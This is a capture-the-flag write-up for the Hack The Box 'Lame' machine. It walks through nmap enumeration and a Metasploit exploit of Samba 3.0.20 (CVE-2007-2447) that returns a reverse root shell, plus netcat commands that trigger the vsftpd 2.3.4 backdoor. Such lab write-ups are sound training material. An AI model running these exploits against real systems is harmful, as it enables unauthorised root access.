
HTB LAME – COMPLETE WRITEUP
Target: 10.129.10.56
Difficulty: Easy
OS: Linux
Goal: Root Access

====================================
1) INITIAL ENUMERATION
====================================

Run full port scan:

nmap -sC -sV -p- 10.129.10.56

Open ports discovered:

21/tcp   ftp     vsftpd 2.3.4
22/tcp   ssh     OpenSSH 4.7p1
139/tcp  netbios Samba
445/tcp  netbios Samba 3.0.20-Debian

Observation:
Two very old services:
- vsftpd 2.3.4 (known backdoor)
- Samba 3.0.20 (known RCE)

FTP anonymous login is allowed but contains nothing useful.
Primary attack surface: Samba 3.0.20.

====================================
2) VULNERABILITY IDENTIFICATION
====================================

Check for Samba exploit:

searchsploit samba 3.0.20

Result:
Samba 3.0.20 < 3.0.25rc3 - username map script command execution
CVE-2007-2447

This vulnerability allows unauthenticated remote command execution.

====================================
3) EXPLOITATION (METASPLOIT METHOD)
====================================

Start Metasploit:

msfconsole

Load exploit module:

use exploit/multi/samba/usermap_script

Set target:

set RHOSTS 10.129.10.56

Set local IP (your VPN IP):

set LHOST 10.10.14.X

Run exploit:

run

Result:
Reverse shell obtained.

====================================
4) VERIFY ACCESS
====================================

Check privileges:

id

Expected result:
uid=0(root)

Root shell is obtained immediately.

====================================
ALTERNATIVE METHOD (FTP BACKDOOR)
====================================

The FTP service is vsftpd 2.3.4, which contains a backdoor.

Trigger using raw TCP:

nc 10.129.10.56 21

Then send:

USER nergal:)
PASS test

After triggering, connect to backdoor port:

nc 10.129.10.56 6200

If successful, a root shell will appear.

====================================
CONCLUSION
====================================

The machine is vulnerable due to outdated Samba version (3.0.20).
The primary exploitation path is unauthenticated RCE via CVE-2007-2447.
Exploitation results in direct root access.

Key OSCP Lesson:
When you see old service versions, always check for known remote code execution vulnerabilities.
Version enumeration is critical.
